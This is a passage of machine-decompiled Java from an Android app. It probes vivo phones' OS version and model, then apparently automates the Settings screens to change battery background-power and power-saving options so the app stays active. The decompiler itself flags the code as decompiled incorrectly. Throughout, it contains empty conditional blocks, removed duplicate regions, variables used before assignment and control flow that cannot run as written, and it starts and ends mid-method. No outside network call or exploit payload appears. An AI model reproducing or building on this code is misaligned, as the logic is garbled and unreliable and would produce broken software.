                vivoSteps$executeBatteryMethodO$12.f54855a1 = i6;
                vivoSteps$executeBatteryMethodO$12.f54856a2 = i5;
                vivoSteps$executeBatteryMethodO$12.f54859a5 = 10;
                objM212393b02 = c0371a83.m212419e7(10, vivoSteps$executeBatteryMethodO$12);
                if (objM212393b02 != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 10:
                i5 = vivoSteps$executeBatteryMethodO$12.f54856a2;
                i6 = vivoSteps$executeBatteryMethodO$12.f54855a1;
                c0371a83 = vivoSteps$executeBatteryMethodO$12.f54854a0;
                kg1.m213544f4(objM212393b02);
                str = "电池";
                i3 = 3;
                j = 300;
                if (!((Boolean) objM212393b02).booleanValue()) {
                }
                break;
            case oe0.DEFAULT_M /* 11 */:
                i5 = vivoSteps$executeBatteryMethodO$12.f54856a2;
                i6 = vivoSteps$executeBatteryMethodO$12.f54855a1;
                c0371a83 = vivoSteps$executeBatteryMethodO$12.f54854a0;
                kg1.m213544f4(objM212393b02);
                str = "电池";
                i3 = 3;
                i5++;
                i4 = i6;
                c0371a8 = c0371a83;
                i2 = Buffer.SEGMENTING_THRESHOLD;
                i8 = 4;
                if (i5 >= i8) {
                }
                break;
            case FileClientSessionCache.MAX_SIZE /* 12 */:
                c0371a85 = vivoSteps$executeBatteryMethodO$12.f54854a0;
                kg1.m213544f4(objM212393b02);
                vivoSteps$executeBatteryMethodO$12.f54854a0 = c0371a85;
                vivoSteps$executeBatteryMethodO$12.f54859a5 = 13;
                if (b81.m210571b1(500L, vivoSteps$executeBatteryMethodO$12) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 13:
                c0371a85 = vivoSteps$executeBatteryMethodO$12.f54854a0;
                kg1.m213544f4(objM212393b02);
                vivoSteps$executeBatteryMethodO$12.f54854a0 = c0371a85;
                vivoSteps$executeBatteryMethodO$12.f54859a5 = 14;
                if (c0371a85.m212430f8(1, "睡眠模式", vivoSteps$executeBatteryMethodO$12, false) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 14:
                c0371a85 = vivoSteps$executeBatteryMethodO$12.f54854a0;
                kg1.m213544f4(objM212393b02);
                vivoSteps$executeBatteryMethodO$12.f54854a0 = c0371a85;
                vivoSteps$executeBatteryMethodO$12.f54859a5 = 15;
                if (b81.m210571b1(500L, vivoSteps$executeBatteryMethodO$12) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case WebSocketProtocol.B0_MASK_OPCODE /* 15 */:
                c0371a86 = vivoSteps$executeBatteryMethodO$12.f54854a0;
                kg1.m213544f4(objM212393b02);
                c0371a86.f55142a3.m214998b3("vivo_battery_saving_done");
                return Boolean.TRUE;
            default:
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:103:0x0309 A[PHI: r2 r4 r5
      0x0309: PHI (r2v21 com.storm.safe.rock.service.modules.yw5xud.a8) = (r2v17 com.storm.safe.rock.service.modules.yw5xud.a8), (r2v22 com.storm.safe.rock.service.modules.yw5xud.a8) binds: [B:110:0x0336, B:102:0x0307] A[DONT_GENERATE, DONT_INLINE]
      0x0309: PHI (r4v42 java.lang.String) = (r4v38 java.lang.String), (r4v43 java.lang.String) binds: [B:110:0x0336, B:102:0x0307] A[DONT_GENERATE, DONT_INLINE]
      0x0309: PHI (r5v11 boolean) = (r5v7 boolean), (r5v12 boolean) binds: [B:110:0x0336, B:102:0x0307] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:104:0x030c A[PHI: r2 r3 r4 r5
      0x030c: PHI (r2v19 com.storm.safe.rock.service.modules.yw5xud.a8) = (r2v17 com.storm.safe.rock.service.modules.yw5xud.a8), (r2v22 com.storm.safe.rock.service.modules.yw5xud.a8) binds: [B:110:0x0336, B:102:0x0307] A[DONT_GENERATE, DONT_INLINE]
      0x030c: PHI (r3v15 int) = (r3v13 int), (r3v18 int) binds: [B:110:0x0336, B:102:0x0307] A[DONT_GENERATE, DONT_INLINE]
      0x030c: PHI (r4v40 java.lang.String) = (r4v38 java.lang.String), (r4v43 java.lang.String) binds: [B:110:0x0336, B:102:0x0307] A[DONT_GENERATE, DONT_INLINE]
      0x030c: PHI (r5v9 boolean) = (r5v7 boolean), (r5v12 boolean) binds: [B:110:0x0336, B:102:0x0307] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:105:0x030e  */
    /* JADX WARN: Removed duplicated region for block: B:108:0x032d  */
    /* JADX WARN: Removed duplicated region for block: B:114:0x0344  */
    /* JADX WARN: Removed duplicated region for block: B:116:0x034c  */
    /* JADX WARN: Removed duplicated region for block: B:117:0x034e  */
    /* JADX WARN: Removed duplicated region for block: B:35:0x0187  */
    /* JADX WARN: Removed duplicated region for block: B:37:0x0191  */
    /* JADX WARN: Removed duplicated region for block: B:42:0x01b6  */
    /* JADX WARN: Removed duplicated region for block: B:44:0x01c0  */
    /* JADX WARN: Removed duplicated region for block: B:52:0x01fb A[PHI: r4 r9 r11 r12 r13 r14 r15
      0x01fb: PHI (r4v19 int) = (r4v17 int), (r4v20 int) binds: [B:50:0x01f7, B:17:0x0074] A[DONT_GENERATE, DONT_INLINE]
      0x01fb: PHI (r9v10 int) = (r9v8 int), (r9v11 int) binds: [B:50:0x01f7, B:17:0x0074] A[DONT_GENERATE, DONT_INLINE]
      0x01fb: PHI (r11v12 java.lang.String) = (r11v10 java.lang.String), (r11v13 java.lang.String) binds: [B:50:0x01f7, B:17:0x0074] A[DONT_GENERATE, DONT_INLINE]
      0x01fb: PHI (r12v9 java.lang.String) = (r12v7 java.lang.String), (r12v10 java.lang.String) binds: [B:50:0x01f7, B:17:0x0074] A[DONT_GENERATE, DONT_INLINE]
      0x01fb: PHI (r13v8 java.lang.String) = (r13v6 java.lang.String), (r13v9 java.lang.String) binds: [B:50:0x01f7, B:17:0x0074] A[DONT_GENERATE, DONT_INLINE]
      0x01fb: PHI (r14v10 java.lang.String) = (r14v8 java.lang.String), (r14v12 java.lang.String) binds: [B:50:0x01f7, B:17:0x0074] A[DONT_GENERATE, DONT_INLINE]
      0x01fb: PHI (r15v11 com.storm.safe.rock.service.modules.yw5xud.a8) = (r15v9 com.storm.safe.rock.service.modules.yw5xud.a8), (r15v12 com.storm.safe.rock.service.modules.yw5xud.a8) binds: [B:50:0x01f7, B:17:0x0074] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:55:0x0215  */
    /* JADX WARN: Removed duplicated region for block: B:58:0x021e  */
    /* JADX WARN: Removed duplicated region for block: B:69:0x0260 A[PHI: r2 r4
      0x0260: PHI (r2v13 com.storm.safe.rock.service.modules.yw5xud.a8) = (r2v11 com.storm.safe.rock.service.modules.yw5xud.a8), (r2v15 com.storm.safe.rock.service.modules.yw5xud.a8) binds: [B:68:0x025e, B:80:0x029a] A[DONT_GENERATE, DONT_INLINE]
      0x0260: PHI (r4v33 java.lang.String) = (r4v31 java.lang.String), (r4v36 java.lang.String) binds: [B:68:0x025e, B:80:0x029a] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:71:0x0265 A[PHI: r2 r3 r4
      0x0265: PHI (r2v14 com.storm.safe.rock.service.modules.yw5xud.a8) = (r2v11 com.storm.safe.rock.service.modules.yw5xud.a8), (r2v15 com.storm.safe.rock.service.modules.yw5xud.a8) binds: [B:68:0x025e, B:80:0x029a] A[DONT_GENERATE, DONT_INLINE]
      0x0265: PHI (r3v10 int) = (r3v6 int), (r3v11 int) binds: [B:68:0x025e, B:80:0x029a] A[DONT_GENERATE, DONT_INLINE]
      0x0265: PHI (r4v35 java.lang.String) = (r4v31 java.lang.String), (r4v36 java.lang.String) binds: [B:68:0x025e, B:80:0x029a] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:72:0x0267  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0017  */
    /* JADX WARN: Removed duplicated region for block: B:82:0x029d  */
    /* renamed from: b9 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212401b9(String str, ContinuationImpl continuationImpl) throws Throwable {
        VivoSteps$executeBatteryOptimization$1 vivoSteps$executeBatteryOptimization$1;
        String strM212384e2;
        String strM212384e22;
        int i;
        String str2;
        C0371a8 c0371a8;
        String str3;
        int i2;
        C0371a8 c0371a82;
        boolean z;
        int i3;
        String str4;
        C0371a8 c0371a83;
        C0371a8 c0371a84;
        if (continuationImpl instanceof VivoSteps$executeBatteryOptimization$1) {
            vivoSteps$executeBatteryOptimization$1 = (VivoSteps$executeBatteryOptimization$1) continuationImpl;
            int i4 = vivoSteps$executeBatteryOptimization$1.f54869a9;
            if ((i4 & Integer.MIN_VALUE) != 0) {
                vivoSteps$executeBatteryOptimization$1.f54869a9 = i4 - Integer.MIN_VALUE;
            } else {
                vivoSteps$executeBatteryOptimization$1 = new VivoSteps$executeBatteryOptimization$1(this, continuationImpl);
            }
        }
        Object objM212393b0 = vivoSteps$executeBatteryOptimization$1.f54867a7;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i5 = vivoSteps$executeBatteryOptimization$1.f54869a9;
        VivoSteps$FlowType vivoSteps$FlowType = VivoSteps$FlowType.BATTERY_POWER_SAVING;
        VivoSteps$FlowType vivoSteps$FlowType2 = VivoSteps$FlowType.BATTERY_BACKGROUND_POWER;
        switch (i5) {
            case 0:
                kg1.m213544f4(objM212393b0);
                w20 w20Var = this.f55142a3;
                SharedPreferences sharedPreferences = w20Var.f60755a0;
                SharedPreferences sharedPreferences2 = w20Var.f60755a0;
                boolean z2 = sharedPreferences.getBoolean("vivo_battery_page_opened", false);
                boolean z3 = sharedPreferences2.getBoolean("vivo_battery_background_done", false);
                boolean z4 = sharedPreferences2.getBoolean("vivo_battery_saving_done", false);
                if (z2 && z3 && z4) {
                    w20Var.m214997b2(vivoSteps$FlowType2);
                    w20Var.m214997b2(vivoSteps$FlowType);
                    return Boolean.TRUE;
                }
                strM212384e2 = m212384e2("ro.vivo.os.version");
                strM212384e22 = m212384e2("ro.vivo.os.build.display.id");
                i = Build.VERSION.SDK_INT;
                str2 = Build.MODEL;
                String str5 = Build.BRAND;
                String str6 = this.f55141a2;
                t60.m214704c5(str6, "╔══════════════════════════════════════════════════════════════");
                t60.m214704c5(str6, "║ [电池优化] 设备信息");
                t60.m214704c5(str6, "║ 品牌: " + str5 + ", 型号: " + str2);
                t60.m214704c5(str6, AbstractC0003a2.m31b2("║ SDK: ", i, " (Android ", i + (-16), ")"));
                t60.m214704c5(str6, "║ VIVO版本: " + strM212384e2 + ", BuildId: " + strM212384e22);
                t60.m214704c5(str6, "╚══════════════════════════════════════════════════════════════");
                if (m212417e5()) {
                    c0371a8 = this;
                    str3 = str;
                    i2 = 1;
                    vivoSteps$executeBatteryOptimization$1.f54860a0 = c0371a8;
                    vivoSteps$executeBatteryOptimization$1.f54861a1 = str3;
                    vivoSteps$executeBatteryOptimization$1.f54862a2 = strM212384e2;
                    vivoSteps$executeBatteryOptimization$1.f54863a3 = strM212384e22;
                    vivoSteps$executeBatteryOptimization$1.f54864a4 = str2;
                    vivoSteps$executeBatteryOptimization$1.f54865a5 = i;
                    vivoSteps$executeBatteryOptimization$1.f54866a6 = i2;
                    vivoSteps$executeBatteryOptimization$1.f54869a9 = 4;
                    if (c0371a8.m212388a5(vivoSteps$executeBatteryOptimization$1) != coroutineSingletons) {
                    }
                    return coroutineSingletons;
                }
                vivoSteps$executeBatteryOptimization$1.f54860a0 = this;
                vivoSteps$executeBatteryOptimization$1.f54861a1 = str;
                vivoSteps$executeBatteryOptimization$1.f54862a2 = strM212384e2;
                vivoSteps$executeBatteryOptimization$1.f54863a3 = strM212384e22;
                vivoSteps$executeBatteryOptimization$1.f54864a4 = str2;
                vivoSteps$executeBatteryOptimization$1.f54865a5 = i;
                vivoSteps$executeBatteryOptimization$1.f54866a6 = 1;
                vivoSteps$executeBatteryOptimization$1.f54869a9 = 1;
                Object objM212419e7 = m212419e7(10, vivoSteps$executeBatteryOptimization$1);
                if (objM212419e7 != coroutineSingletons) {
                    c0371a8 = this;
                    str3 = str;
                    objM212393b0 = objM212419e7;
                    i2 = 1;
                    if (((Boolean) objM212393b0).booleanValue()) {
                        t60.m214704c5(c0371a8.f55141a2, "[电池优化] ❌ 打开设置失败");
                        return Boolean.FALSE;
                    }
                    vivoSteps$executeBatteryOptimization$1.f54860a0 = c0371a8;
                    vivoSteps$executeBatteryOptimization$1.f54861a1 = str3;
                    vivoSteps$executeBatteryOptimization$1.f54862a2 = strM212384e2;
                    vivoSteps$executeBatteryOptimization$1.f54863a3 = strM212384e22;
                    vivoSteps$executeBatteryOptimization$1.f54864a4 = str2;
                    vivoSteps$executeBatteryOptimization$1.f54865a5 = i;
                    vivoSteps$executeBatteryOptimization$1.f54866a6 = i2;
                    vivoSteps$executeBatteryOptimization$1.f54869a9 = 2;
                    objM212393b0 = c0371a8.m212393b0("电池", Buffer.SEGMENTING_THRESHOLD, 3, vivoSteps$executeBatteryOptimization$1);
                    if (objM212393b0 != coroutineSingletons) {
                        if (((Boolean) objM212393b0).booleanValue()) {
                            t60.m214704c5(c0371a8.f55141a2, "[电池优化] ❌ 未找到电池入口");
                            return Boolean.FALSE;
                        }
                        vivoSteps$executeBatteryOptimization$1.f54860a0 = c0371a8;
                        vivoSteps$executeBatteryOptimization$1.f54861a1 = str3;
                        vivoSteps$executeBatteryOptimization$1.f54862a2 = strM212384e2;
                        vivoSteps$executeBatteryOptimization$1.f54863a3 = strM212384e22;
                        vivoSteps$executeBatteryOptimization$1.f54864a4 = str2;
                        vivoSteps$executeBatteryOptimization$1.f54865a5 = i;
                        vivoSteps$executeBatteryOptimization$1.f54866a6 = i2;
                        vivoSteps$executeBatteryOptimization$1.f54869a9 = 3;
                        String str7 = str2;
                        if (b81.m210571b1(800L, vivoSteps$executeBatteryOptimization$1) != coroutineSingletons) {
                            str2 = str7;
                            vivoSteps$executeBatteryOptimization$1.f54860a0 = c0371a8;
                            vivoSteps$executeBatteryOptimization$1.f54861a1 = str3;
                            vivoSteps$executeBatteryOptimization$1.f54862a2 = strM212384e2;
                            vivoSteps$executeBatteryOptimization$1.f54863a3 = strM212384e22;
                            vivoSteps$executeBatteryOptimization$1.f54864a4 = str2;
                            vivoSteps$executeBatteryOptimization$1.f54865a5 = i;
                            vivoSteps$executeBatteryOptimization$1.f54866a6 = i2;
                            vivoSteps$executeBatteryOptimization$1.f54869a9 = 4;
                            if (c0371a8.m212388a5(vivoSteps$executeBatteryOptimization$1) != coroutineSingletons) {
                                vivoSteps$executeBatteryOptimization$1.f54860a0 = c0371a8;
                                vivoSteps$executeBatteryOptimization$1.f54861a1 = strM212384e2;
                                vivoSteps$executeBatteryOptimization$1.f54862a2 = strM212384e22;
                                vivoSteps$executeBatteryOptimization$1.f54863a3 = str2;
                                vivoSteps$executeBatteryOptimization$1.f54864a4 = null;
                                vivoSteps$executeBatteryOptimization$1.f54865a5 = i;
                                vivoSteps$executeBatteryOptimization$1.f54866a6 = i2;
                                vivoSteps$executeBatteryOptimization$1.f54869a9 = 5;
                                objM212393b0 = c0371a8.m212398b6(str3, vivoSteps$executeBatteryOptimization$1);
                                if (objM212393b0 != coroutineSingletons) {
                                    c0371a82 = c0371a8;
                                    if (!((Boolean) objM212393b0).booleanValue()) {
                                        t60.m214704c5(c0371a82.f55141a2, "[电池优化] ❌ 后台耗电设置失败");
                                        i2 = 0;
                                    }
                                    if (!t60.m214686a2(strM212384e2, "12.0") && t60.m214686a2(strM212384e22, "OriginOS 1.0")) {
                                        t60.m214704c5(c0371a82.f55141a2, "[电池优化] 匹配: OriginOS 1.0 → 智能后台 + O");
                                        vivoSteps$executeBatteryOptimization$1.f54860a0 = c0371a82;
                                        vivoSteps$executeBatteryOptimization$1.f54861a1 = "智能后台 + O";
                                        vivoSteps$executeBatteryOptimization$1.f54862a2 = null;
                                        vivoSteps$executeBatteryOptimization$1.f54863a3 = null;
                                        vivoSteps$executeBatteryOptimization$1.f54865a5 = i2;
                                        vivoSteps$executeBatteryOptimization$1.f54869a9 = 6;
                                        objM212393b0 = c0371a82.m212400b8(vivoSteps$executeBatteryOptimization$1);
                                        if (objM212393b0 != coroutineSingletons) {
                                            i3 = i2;
                                            str4 = "智能后台 + O";
                                            c0371a84 = c0371a82;
                                            if (((Boolean) objM212393b0).booleanValue()) {
                                            }
                                            z = true;
                                            String str8 = c0371a82.f55141a2;
                                            w20 w20Var2 = c0371a82.f55142a3;
                                            tz0.m214807a7("[电池优化] ✅ 使用方法组合: ", str4, str8);
                                            if (i3 != 0) {
                                            }
                                            return Boolean.valueOf(i3 == 0 ? z : false);
                                        }
                                    } else if (AbstractC0779a1.m213652a5(strM212384e22, "Funtouch", true) || i <= 28) {
                                        z = true;
                                        if (!AbstractC0779a1.m213652a5(strM212384e22, "Funtouch", true) && i <= 28) {
                                            t60.m214704c5(c0371a82.f55141a2, "[电池优化] 匹配: Funtouch OS + Android 9及以下 → 智能后台 (Android 9及以下无需额外省电设置)");
                                            i3 = i2;
                                            str4 = "智能后台 (Android 9及以下无需额外省电设置)";
                                            String str82 = c0371a82.f55141a2;
                                            w20 w20Var22 = c0371a82.f55142a3;
                                            tz0.m214807a7("[电池优化] ✅ 使用方法组合: ", str4, str82);
                                            if (i3 != 0) {
                                            }
                                            return Boolean.valueOf(i3 == 0 ? z : false);
                                        }
                                        if (!AbstractC0779a1.m213656a9(str2, "V2061A") || AbstractC0779a1.m213656a9(str2, "V2106A") || AbstractC0779a1.m213656a9(str2, "V2054A") || AbstractC0779a1.m213656a9(str2, "V1916A") || AbstractC0779a1.m213656a9(str2, "V1912A")) {
                                            tz0.m214809a9("[电池优化] 匹配: 型号", str2, " → 智能后台 + O", c0371a82.f55141a2);
                                            vivoSteps$executeBatteryOptimization$1.f54860a0 = c0371a82;
                                            vivoSteps$executeBatteryOptimization$1.f54861a1 = "智能后台 + O";
                                            vivoSteps$executeBatteryOptimization$1.f54862a2 = null;
                                            vivoSteps$executeBatteryOptimization$1.f54863a3 = null;
                                            vivoSteps$executeBatteryOptimization$1.f54865a5 = i2;
                                            vivoSteps$executeBatteryOptimization$1.f54869a9 = 8;
                                            objM212393b0 = c0371a82.m212400b8(vivoSteps$executeBatteryOptimization$1);
                                            if (objM212393b0 != coroutineSingletons) {
                                                i3 = i2;
                                                str4 = "智能后台 + O";
                                                c0371a83 = c0371a82;
                                                if (((Boolean) objM212393b0).booleanValue()) {
                                                    c0371a82 = c0371a83;
                                                    i3 = 0;
                                                } else {
                                                    c0371a82 = c0371a83;
                                                }
                                                String str822 = c0371a82.f55141a2;
                                                w20 w20Var222 = c0371a82.f55142a3;
                                                tz0.m214807a7("[电池优化] ✅ 使用方法组合: ", str4, str822);
                                                if (i3 != 0) {
                                                    w20Var222.m214997b2(vivoSteps$FlowType2);
                                                    w20Var222.m214997b2(vivoSteps$FlowType);
                                                }
                                                return Boolean.valueOf(i3 == 0 ? z : false);
                                            }
                                        } else {
                                            tz0.m214806a6("[电池优化] 匹配: 默认/SDK=", i, " → 智能后台 + N", c0371a82.f55141a2);
                                            vivoSteps$executeBatteryOptimization$1.f54860a0 = c0371a82;
                                            vivoSteps$executeBatteryOptimization$1.f54861a1 = "智能后台 + N";
                                            vivoSteps$executeBatteryOptimization$1.f54862a2 = null;
                                            vivoSteps$executeBatteryOptimization$1.f54863a3 = null;
                                            vivoSteps$executeBatteryOptimization$1.f54865a5 = i2;
                                            vivoSteps$executeBatteryOptimization$1.f54869a9 = 9;
                                            Object objM212399b7 = c0371a82.m212399b7(vivoSteps$executeBatteryOptimization$1);
                                            if (objM212399b7 != coroutineSingletons) {
                                                i3 = i2;
                                                str4 = "智能后台 + N";
                                                objM212393b0 = objM212399b7;
                                                c0371a83 = c0371a82;
                                                if (((Boolean) objM212393b0).booleanValue()) {
                                                }
                                                String str8222 = c0371a82.f55141a2;
                                                w20 w20Var2222 = c0371a82.f55142a3;
                                                tz0.m214807a7("[电池优化] ✅ 使用方法组合: ", str4, str8222);
                                                if (i3 != 0) {
                                                }
                                                return Boolean.valueOf(i3 == 0 ? z : false);
                                            }
                                        }
                                    } else {
                                        t60.m214704c5(c0371a82.f55141a2, "[电池优化] 匹配: Funtouch OS + Android 10+ → 智能后台 + O");
                                        vivoSteps$executeBatteryOptimization$1.f54860a0 = c0371a82;
                                        vivoSteps$executeBatteryOptimization$1.f54861a1 = "智能后台 + O";
                                        vivoSteps$executeBatteryOptimization$1.f54862a2 = null;
                                        vivoSteps$executeBatteryOptimization$1.f54863a3 = null;
                                        vivoSteps$executeBatteryOptimization$1.f54865a5 = i2;
                                        vivoSteps$executeBatteryOptimization$1.f54869a9 = 7;
                                        objM212393b0 = c0371a82.m212400b8(vivoSteps$executeBatteryOptimization$1);
                                        if (objM212393b0 != coroutineSingletons) {
                                            i3 = i2;
                                            str4 = "智能后台 + O";
                                            c0371a84 = c0371a82;
                                            if (((Boolean) objM212393b0).booleanValue()) {
                                                c0371a82 = c0371a84;
                                                i3 = 0;
                                            } else {
                                                c0371a82 = c0371a84;
                                            }
                                            z = true;
                                            String str82222 = c0371a82.f55141a2;
                                            w20 w20Var22222 = c0371a82.f55142a3;
                                            tz0.m214807a7("[电池优化] ✅ 使用方法组合: ", str4, str82222);
                                            if (i3 != 0) {
                                            }
                                            return Boolean.valueOf(i3 == 0 ? z : false);
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
                return coroutineSingletons;
            case 1:
                i2 = vivoSteps$executeBatteryOptimization$1.f54866a6;
                i = vivoSteps$executeBatteryOptimization$1.f54865a5;
                str2 = vivoSteps$executeBatteryOptimization$1.f54864a4;
                strM212384e22 = vivoSteps$executeBatteryOptimization$1.f54863a3;
                strM212384e2 = vivoSteps$executeBatteryOptimization$1.f54862a2;
                str3 = vivoSteps$executeBatteryOptimization$1.f54861a1;
                c0371a8 = vivoSteps$executeBatteryOptimization$1.f54860a0;
                kg1.m213544f4(objM212393b0);
                if (((Boolean) objM212393b0).booleanValue()) {
                }
                break;
            case 2:
                i2 = vivoSteps$executeBatteryOptimization$1.f54866a6;
                int i6 = vivoSteps$executeBatteryOptimization$1.f54865a5;
                String str9 = vivoSteps$executeBatteryOptimization$1.f54864a4;
                String str10 = vivoSteps$executeBatteryOptimization$1.f54863a3;
                String str11 = vivoSteps$executeBatteryOptimization$1.f54862a2;
                String str12 = vivoSteps$executeBatteryOptimization$1.f54861a1;
                C0371a8 c0371a85 = vivoSteps$executeBatteryOptimization$1.f54860a0;
                kg1.m213544f4(objM212393b0);
                c0371a8 = c0371a85;
                i = i6;
                str2 = str9;
                strM212384e22 = str10;
                strM212384e2 = str11;
                str3 = str12;
                if (((Boolean) objM212393b0).booleanValue()) {
                }
                break;
            case 3:
                i2 = vivoSteps$executeBatteryOptimization$1.f54866a6;
                int i7 = vivoSteps$executeBatteryOptimization$1.f54865a5;
                str2 = vivoSteps$executeBatteryOptimization$1.f54864a4;
                strM212384e22 = vivoSteps$executeBatteryOptimization$1.f54863a3;
                strM212384e2 = vivoSteps$executeBatteryOptimization$1.f54862a2;
                str3 = vivoSteps$executeBatteryOptimization$1.f54861a1;
                c0371a8 = vivoSteps$executeBatteryOptimization$1.f54860a0;
                kg1.m213544f4(objM212393b0);
                i = i7;
                vivoSteps$executeBatteryOptimization$1.f54860a0 = c0371a8;
                vivoSteps$executeBatteryOptimization$1.f54861a1 = str3;
                vivoSteps$executeBatteryOptimization$1.f54862a2 = strM212384e2;
                vivoSteps$executeBatteryOptimization$1.f54863a3 = strM212384e22;
                vivoSteps$executeBatteryOptimization$1.f54864a4 = str2;
                vivoSteps$executeBatteryOptimization$1.f54865a5 = i;
                vivoSteps$executeBatteryOptimization$1.f54866a6 = i2;
                vivoSteps$executeBatteryOptimization$1.f54869a9 = 4;
                if (c0371a8.m212388a5(vivoSteps$executeBatteryOptimization$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 4:
                i2 = vivoSteps$executeBatteryOptimization$1.f54866a6;
                int i8 = vivoSteps$executeBatteryOptimization$1.f54865a5;
                str2 = vivoSteps$executeBatteryOptimization$1.f54864a4;
                strM212384e22 = vivoSteps$executeBatteryOptimization$1.f54863a3;
                strM212384e2 = vivoSteps$executeBatteryOptimization$1.f54862a2;
                str3 = vivoSteps$executeBatteryOptimization$1.f54861a1;
                c0371a8 = vivoSteps$executeBatteryOptimization$1.f54860a0;
                kg1.m213544f4(objM212393b0);
                i = i8;
                vivoSteps$executeBatteryOptimization$1.f54860a0 = c0371a8;
                vivoSteps$executeBatteryOptimization$1.f54861a1 = strM212384e2;
                vivoSteps$executeBatteryOptimization$1.f54862a2 = strM212384e22;
                vivoSteps$executeBatteryOptimization$1.f54863a3 = str2;
                vivoSteps$executeBatteryOptimization$1.f54864a4 = null;
                vivoSteps$executeBatteryOptimization$1.f54865a5 = i;
                vivoSteps$executeBatteryOptimization$1.f54866a6 = i2;
                vivoSteps$executeBatteryOptimization$1.f54869a9 = 5;
                objM212393b0 = c0371a8.m212398b6(str3, vivoSteps$executeBatteryOptimization$1);
                if (objM212393b0 != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 5:
                i2 = vivoSteps$executeBatteryOptimization$1.f54866a6;
                int i9 = vivoSteps$executeBatteryOptimization$1.f54865a5;
                str2 = vivoSteps$executeBatteryOptimization$1.f54863a3;
                strM212384e22 = vivoSteps$executeBatteryOptimization$1.f54862a2;
                strM212384e2 = vivoSteps$executeBatteryOptimization$1.f54861a1;
                c0371a82 = vivoSteps$executeBatteryOptimization$1.f54860a0;
                kg1.m213544f4(objM212393b0);
                i = i9;
                if (!((Boolean) objM212393b0).booleanValue()) {
                }
                if (!t60.m214686a2(strM212384e2, "12.0")) {
                    if (AbstractC0779a1.m213652a5(strM212384e22, "Funtouch", true)) {
                        z = true;
                        if (!AbstractC0779a1.m213652a5(strM212384e22, "Funtouch", true)) {
                        }
                        if (AbstractC0779a1.m213656a9(str2, "V2061A")) {
                            tz0.m214809a9("[电池优化] 匹配: 型号", str2, " → 智能后台 + O", c0371a82.f55141a2);
                            vivoSteps$executeBatteryOptimization$1.f54860a0 = c0371a82;
                            vivoSteps$executeBatteryOptimization$1.f54861a1 = "智能后台 + O";
                            vivoSteps$executeBatteryOptimization$1.f54862a2 = null;
                            vivoSteps$executeBatteryOptimization$1.f54863a3 = null;
                            vivoSteps$executeBatteryOptimization$1.f54865a5 = i2;
                            vivoSteps$executeBatteryOptimization$1.f54869a9 = 8;
                            objM212393b0 = c0371a82.m212400b8(vivoSteps$executeBatteryOptimization$1);
                            if (objM212393b0 != coroutineSingletons) {
                            }
                            return coroutineSingletons;
                        }
                    }
                    break;
                }
                String str822222 = c0371a82.f55141a2;
                w20 w20Var222222 = c0371a82.f55142a3;
                tz0.m214807a7("[电池优化] ✅ 使用方法组合: ", str4, str822222);
                if (i3 != 0) {
                }
                return Boolean.valueOf(i3 == 0 ? z : false);
            case 6:
                i3 = vivoSteps$executeBatteryOptimization$1.f54865a5;
                str4 = vivoSteps$executeBatteryOptimization$1.f54861a1;
                c0371a84 = vivoSteps$executeBatteryOptimization$1.f54860a0;
                kg1.m213544f4(objM212393b0);
                if (((Boolean) objM212393b0).booleanValue()) {
                }
                z = true;
                String str8222222 = c0371a82.f55141a2;
                w20 w20Var2222222 = c0371a82.f55142a3;
                tz0.m214807a7("[电池优化] ✅ 使用方法组合: ", str4, str8222222);
                if (i3 != 0) {
                }
                return Boolean.valueOf(i3 == 0 ? z : false);
            case 7:
                i3 = vivoSteps$executeBatteryOptimization$1.f54865a5;
                str4 = vivoSteps$executeBatteryOptimization$1.f54861a1;
                c0371a84 = vivoSteps$executeBatteryOptimization$1.f54860a0;
                kg1.m213544f4(objM212393b0);
                if (((Boolean) objM212393b0).booleanValue()) {
                }
                z = true;
                String str82222222 = c0371a82.f55141a2;
                w20 w20Var22222222 = c0371a82.f55142a3;
                tz0.m214807a7("[电池优化] ✅ 使用方法组合: ", str4, str82222222);
                if (i3 != 0) {
                }
                return Boolean.valueOf(i3 == 0 ? z : false);
            case 8:
                i3 = vivoSteps$executeBatteryOptimization$1.f54865a5;
                str4 = vivoSteps$executeBatteryOptimization$1.f54861a1;
                c0371a83 = vivoSteps$executeBatteryOptimization$1.f54860a0;
                kg1.m213544f4(objM212393b0);
                z = true;
                if (((Boolean) objM212393b0).booleanValue()) {
                }
                String str822222222 = c0371a82.f55141a2;
                w20 w20Var222222222 = c0371a82.f55142a3;
                tz0.m214807a7("[电池优化] ✅ 使用方法组合: ", str4, str822222222);
                if (i3 != 0) {
                }
                return Boolean.valueOf(i3 == 0 ? z : false);
            case 9:
                i3 = vivoSteps$executeBatteryOptimization$1.f54865a5;
                str4 = vivoSteps$executeBatteryOptimization$1.f54861a1;
                c0371a83 = vivoSteps$executeBatteryOptimization$1.f54860a0;
                kg1.m213544f4(objM212393b0);
                z = true;
                if (((Boolean) objM212393b0).booleanValue()) {
                }
                String str8222222222 = c0371a82.f55141a2;
                w20 w20Var2222222222 = c0371a82.f55142a3;
                tz0.m214807a7("[电池优化] ✅ 使用方法组合: ", str4, str8222222222);
                if (i3 != 0) {
                }
                return Boolean.valueOf(i3 == 0 ? z : false);
            default:
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:34:0x0084, code lost:
    
        if (r8 == r1) goto L35;
     */
    /* JADX WARN: Removed duplicated region for block: B:31:0x0076  */
    /* JADX WARN: Removed duplicated region for block: B:33:0x0079  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0013  */
    /* renamed from: c0 */
    /*
